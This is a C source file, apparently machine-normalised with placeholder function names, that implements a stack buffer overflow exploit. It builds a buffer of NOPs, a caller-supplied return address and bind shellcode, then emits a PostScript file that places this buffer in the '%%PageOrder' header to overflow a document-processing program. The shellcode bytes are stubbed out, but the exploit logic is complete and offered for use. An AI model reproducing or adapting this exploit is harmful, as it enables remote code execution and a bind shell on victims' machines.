#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int BUFSIZ ; 
 int /*<<< orphan*/  GARBAGE ; 
 int /*<<< orphan*/  NOP ; 
 int SCBUF ; 
 scalar_t__ STDALIGN ; 
 int FUNC0 (char*) ; 
 int /*<<< orphan*/  bindcode ; 
 int /*<<< orphan*/  FUNC1 (char*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC2 (char*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC3 (char*,...) ; 
 int FUNC4 (int /*<<< orphan*/ ) ; 
 long FUNC5 (char*,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC6 (char*) ; 

FUNC7(int argc, char **argv)
{
	int align;	// Align for the buffer
	long retaddr;	// return address
	
	char buf[BUFSIZ];	// The evil buffer
	char *p;		// Pointer to evil buffer

	if(argc != 3)		// 2 Arguments required
	{
		FUNC6(argv[0]);
	}

	// Get align and return address from parameters
	align = FUNC0(argv[1]);
	retaddr = FUNC5(argv[2], 0 , NULL);

	/* DEBUG, Shellcode testing
	void (*dsr)();
	(long) dsr = &bindcode; 
	dsr(); */

	// Point to buffer
	p = buf;

	// Memset the buffer with NOP's
	FUNC2(p, NOP, BUFSIZ);

	p += STDALIGN+align;

	// Write return address in buffer (It's a very simple stack overflow).
	*((void **)p) = (void *) retaddr;
	p+=4;

	// Put shellcode in buffer
	p+=SCBUF-FUNC4(bindcode)-1;
	FUNC1(p, bindcode, FUNC4(bindcode));
	p += FUNC4(bindcode);
	
	// Add some garbage to end of buffer
	p += GARBAGE;
	
	// Null terminate buffer
	*p = 0;
	
	// Generate pdf file
	FUNC3("%%!PS-Adobe-3.0\n");
	FUNC3("%%%%Creator: groff 1.16 (with modifications by zen-parse by hand 1.00a)\n");
	FUNC3("%%%%CreationDate: Sat Jun 15 15:30ish\n");

	// In page order, the stack overflow occur.
	FUNC3("%%%%PageOrder: %s\n", buf);
	FUNC3("%%%%EndComments\n");
	FUNC3("%%%%EOF");	
}